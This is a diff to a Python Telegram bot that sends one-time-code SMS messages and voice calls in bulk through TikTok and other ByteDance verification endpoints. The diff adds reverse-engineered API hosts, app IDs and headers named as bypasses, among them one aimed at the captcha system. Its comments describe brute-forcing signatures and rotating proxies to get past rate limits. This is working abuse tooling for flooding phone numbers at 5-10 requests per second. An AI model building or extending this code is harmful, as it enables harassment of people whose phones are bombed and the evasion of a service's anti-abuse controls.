@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v12.0
+ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v13.0
 ===============================================================
 Features:
 1. 5-10 Concurrent OTP Requests Per Second
@@ -94,14 +94,12 @@ TIKTOKV_MOBILE_DOMAINS = [
     "api-va.tiktokv.com",
     "api16-normal-c-useast2a.tiktokv.com",
     "api16-normal-c-useast1a.tiktokv.com",
-    "api16-normal-useast5.us.tiktokv.com",
     "api16-normal-v4.tiktokv.com",
     "api16-normal-v6.tiktokv.com",
     "api16.tiktokv.com",
     "api19-normal-c-alisg.tiktokv.com",
     "api19-normal-c-useast1a.tiktokv.com",
     "api19-normal-c-useast2a.tiktokv.com",
-    "api19-normal-useast5.us.tiktokv.com",
     "api19.tiktokv.com",
     "api21-normal-c-alisg.tiktokv.com",
     "api21-normal-c-useast2a.tiktokv.com",
@@ -113,6 +111,26 @@ TIKTOKV_MOBILE_DOMAINS = [
     "api2-19-h2.musical.ly",
     "api2-21-h2.musical.ly",
     "api.lemon8-app.com",
+    # APK RE v3.0: NEW host families (verified rate-limited/SUCCESS)
+    "api16-normal-useast5.tiktokv.us",   # NEW .tiktokv.us TLD — SUCCESS confirmed!
+    "api16-normal-useast8.tiktokv.us",   # NEW .tiktokv.us TLD
+    "api21.tiktokv.com",                 # NEW — SUCCESS confirmed (can_send_voice_code)
+    "api21-h2.tiktokv.com",              # NEW h2 variant
+    "api22.tiktokv.com",                 # NEW base
+    "api22-va.tiktokv.com",              # NEW
+    "api23-normal-useast1a.tiktokv.com", # NEW api23 family
+    "api31-normal-alisg.tiktokv.com",    # NEW api31 family (rate-limited = works)
+    "api31-normal-useast1a.tiktokv.com", # NEW api31 family
+    "api32-normal-alisg.tiktokv.com",    # NEW api32 family (rate-limited = works)
+    "api32-normal-useast1a.tiktokv.com", # NEW api32 family
+    "api-normal.tiktokv.com",            # NEW base (rate-limited = works)
+    "api-core.tiktokv.com",              # NEW core variant
+    "api-core-va.tiktokv.com",           # NEW core variant
+    "fp-va.tiktokv.com",                 # NEW feature platform (rate-limited = works)
+    "fp-sg.tiktokv.com",                 # NEW feature platform
+    "fp22-normal-useast1a.tiktokv.com",  # NEW fp22
+    "api19-va.tiktokv.com",              # NEW api19 variant
+    "api16-normal-alisg.helo-api.com",   # NEW! Helo official backend
 ]
 
 # NEW: snssdk.com domains — Chinese ByteDance infra (confirmed SUCCESS for Douyin, Pipix, Toutiao)
@@ -130,6 +148,15 @@ SNSSDK_DOMAINS = [
 # NEW: zijieapi.com domains — Volcengine/ByteDance infra (confirmed SUCCESS for Douyin, Toutiao)
 ZIJIEAPI_DOMAINS = [
     "verify.zijieapi.com",
+]
+
+# hotapi-* host family — completely new from APK RE (rate-limited = signature accepted)
+HOTAPI_DOMAINS = [
+    "hotapi-va.tiktokv.com",
+    "hotapi-sg.tiktokv.com",
+    "hotapi16-normal-alisg.tiktokv.com",
+    "hotapi16-normal-useast1a.tiktokv.com",
+    "hotapi22-normal-useast1a.tiktokv.com",
 ]
 
 # Web domains for /passport/web/send_code/ (NO signing needed)
@@ -168,12 +195,15 @@ CONFIRMED_APPS = {
                     "verify.zijieapi.com"],
     },
     "douyin_web_s": {
-        # SUCCESS: us.tiktok.com tc=3635 region=DE
+        # SUCCESS: us.tiktok.com tc=3635 region=DE + api16-normal-useast5.tiktokv.us tc=3734 (APK RE v3.0)
         "name": "Douyin Web (CONFIRMED)", "aid": 1988, "app_name": "douyin_web",
         "package": "douyin_web", "version_code": "1", "version_name": "1.0",
         "channel": "douyin_web",
-        "type_codes": [3635, 3532],
-        "domains": ["us.tiktok.com", "www.tiktok.com"],
+        "type_codes": [3635, 3532, 3734],
+        "domains": ["us.tiktok.com", "www.tiktok.com",
+                    "api16-normal-useast5.tiktokv.us",   # APK RE v3.0: SUCCESS on .tiktokv.us!
+                    "api19-normal-c-useast1a.tiktokv.com",  # APK RE v3.0: SUCCESS
+                    "api2-16-h2.musical.ly"],              # APK RE v3.0: SUCCESS
         "needs_proxy": True, "web_endpoint": True,
     },
     "huoshan_s": {
@@ -222,7 +252,11 @@ CONFIRMED_APPS = {
         "channel": "googleplay",
         "type_codes": [3635, 3637, 3634, 3734, 3532],
         "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
-                    "api-t2.tiktokv.com", "api19-normal-c-useast2a.tiktokv.com"],
+                    "api-t2.tiktokv.com", "api19-normal-c-useast2a.tiktokv.com",
+                    "api21.tiktokv.com", "api-h2.tiktokv.com",              # APK RE v3.0: SUCCESS
+                    "api22-normal-c-alisg.tiktokv.com",                     # APK RE v3.0: RL
+                    "api31-normal-alisg.tiktokv.com",                       # APK RE v3.0: RL
+                    "api32-normal-useast1a.tiktokv.com"],                   # APK RE v3.0: RL
         "register_domain": "api3-normal-c-lf.amemv.com",
         "needs_proxy": True,
         "alt_endpoint": "/passport/mobile/send_code/",  # Also works without v1!
@@ -298,6 +332,60 @@ CONFIRMED_APPS = {
         "needs_proxy": True, "voice_endpoint": True,
     },
     # ======== END VOICE CALL SECTION ========
+    # ======== APK RE v3.0: NEW AIDs discovered from TikTok APK config blobs ========
+    "bd473824_s": {
+        # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
+        # Rate-limited on /passport/web/send_code/, /passport/mobile/send_code/v1/ (=works with fresh IP)
+        "name": "BD 473824 (CONFIRMED)", "aid": 473824, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3532, 3637, 3634, 3734],
+        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+                    "api21.tiktokv.com", "api-h2.tiktokv.com",
+                    "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True,
+    },
+    "bd567753_s": {
+        # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
+        # Rate-limited on /passport/web/send_code/, /passport/mobile/sms_login/ (=works with fresh IP)
+        "name": "BD 567753 (CONFIRMED)", "aid": 567753, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3532, 3637, 3634, 3734],
+        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+                    "api21.tiktokv.com", "api-h2.tiktokv.com",
+                    "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True,
+    },
+    "bd473824_voice": {
+        # APK RE v3.0: Voice call on NEW AID 473824 (SUCCESS confirmed on can_send_voice_code)
+        "name": "BD 473824 Voice (CONFIRMED)", "aid": 473824, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3532, 3637],
+        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+                    "api21.tiktokv.com", "api-h2.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    "bd567753_voice": {
+        # APK RE v3.0: Voice call on NEW AID 567753 (SUCCESS confirmed on can_send_voice_code)
+        "name": "BD 567753 Voice (CONFIRMED)", "aid": 567753, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3532, 3637],
+        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
+                    "api21.tiktokv.com", "api-h2.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    # ======== END APK RE v3.0 SECTION ========
     "bd2658_s": {
         # CONFIRMED SUCCESS in signed brute force (PR#5), currently rate-limited on all proxy IPs
         "name": "BD 2658/Lemon8 (CONFIRMED)", "aid": 2658, "app_name": "musical_ly",
@@ -958,11 +1046,17 @@ class ByteDanceOTPSender:
             "X-SS-DP": str(config["aid"]),
             "User-Agent": f"{self.app['package']}/{config['version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{build_id}; Cronet/TTNetVersion:{cronet_parts[0]} {cronet_parts[1]} QuicVersion:c459d547 2024-08-27)",
             "Accept-Encoding": "gzip, deflate",
-            # Enhanced bypass headers (discovered via Ultra Brute Force v2.0 research)
+            # Enhanced bypass headers (discovered via Ultra Brute Force v2.0 + APK RE v3.0)
             "x-tt-bypass-dp": "1",
             "x-tt-dm-status": "login=0;ct=0;rt=7",
             "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
             "x-tt-store-region-src": "did",
+            # APK RE v3.0: NEW headers from TikTok 45.0.42 DEX analysis
+            "x-tt-bypass-bdturing": "1",
+            "x-tt-cmpl-token": "",
+            "x-tt-cipher-version": "1",
+            "x-tt-app-init-region": random.choice(["US", "AU", "DE", "SG", "GB"]),
+            "x-tt-request-tag": "t=0;n=1",
             "X-Gorgon": signatures.get("x-gorgon", ""),
             "X-Khronos": signatures.get("x-khronos", str(timestamp)),
             "X-Argus": signatures.get("x-argus", ""),
@@ -1714,7 +1808,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     msg = f"""
-ðŸš€ <b>ByteDance Multi-App OTP Bot v11.0</b>
+ðŸš€ <b>ByteDance Multi-App OTP Bot v13.0</b>
 
 âš¡ <b>Performance:</b>
 â€¢ 5-10 Concurrent OTP/Second
